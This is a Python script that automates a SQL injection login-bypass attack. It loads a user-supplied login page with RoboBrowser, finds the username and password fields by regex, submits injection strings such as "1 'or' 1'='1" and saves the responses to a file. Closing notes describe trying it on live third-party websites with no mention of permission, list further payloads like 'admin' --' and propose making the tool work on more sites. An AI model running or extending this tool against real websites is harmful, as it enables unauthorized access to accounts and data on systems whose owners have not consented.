from robobrowser import RoboBrowser
import re,time

website = input('[>]Input the URL of the login page or webpage:')

#Another user-agent of you choice can be specified
user_agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
simple_slqi = ["1 'or' 1'='1",'1 "or" 1"="1']

def sqli(username_field,passwd_field,form,browser_instance):
	#print(form)
	print(username_field)
	print(passwd_field)
	for exploit in simple_slqi : 
		if passwd_field != None:
			form[passwd_field].value = exploit
		form[username_field].value = exploit
		try: 				
			browser_instance.submit_form(form)
			file1 = open('exploit1_results.txt','a')
			file1.write('\n'+'-'*50+'\n'+exploit+'\n'+'-'*50+'\n')
			webpage_code = browser_instance.parsed()
			file1.write(str(webpage_code))
			file1.close()
		except Exception as e : 
			print('[>]Exception occured:',e)

browser_instance = RoboBrowser(user_agent=user_agent,parser='html.parser',history=True)
browser_instance.open(website)
#print(browser_instance.session.headers)
#print(browser_instance.session.cookies)
for form in browser_instance.get_forms():
	key_words = re.compile('(?<= ).*username=|(?<= ).*user=|(?<= ).*login=',flags=re.I)
	match_user = re.search(key_words,str(form)) 
	if match_user is not None :
		file1 = open('exploit1_results.txt','w')
		file1.close()
		starting_position, ending_postion = match_user.span()[0],match_user.span()[1]
		username_field_value = match_user.string[starting_position:ending_postion]
		print('[>]Found username field. Looking for password field')
		print(username_field_value)
		key_words = re.compile('(?<=, ).*password=|(?<=, ).*passwd=|(?<=, ).*pass=|(?<=, ).*pwd',flags=re.I)
		match_password = re.search(key_words,str(form))
		if match_password is not None : 
			print(match_password)
			starting_position,ending_postion = match_password.span()[0],match_password.span()[1]
			password_field_value = match_password.string[starting_position:ending_postion]
			print('[>]Found password field. Executing attack.')
			sqli(username_field_value,password_field_value,form,browser_instance) 
		else : 
			print('[!]Password field not available, using only username.')
			sqli(username_field_value,None,form,browser_instance) 
	else : 
		pass


"""
Notes : 

This script is supposed to automate a simple SQLi injection attack
I tried it on hackforums and github and I correctly got a invalid username
and password which proves the script did well. I tried in more websites
for instance in web.de, but the problem is, it is been difficult to
adapt the script to any web site, since it always need to find a login
form with user and password or only username. I think there must 
be a way to make this script more dynamic so it can work on a more 
vast quantity of websites without raising errors. The exploits used 
are in the list simple_sqli.

Maybe see RoboBrowser documentation to 
find matches of ids, names or classes inside a RoboBrowser form match . 

These functionalities can also be added to this script.
Python list of examples  : ['admin" --', "admin' --",'admin" #', "admin' #" ] 
"""	
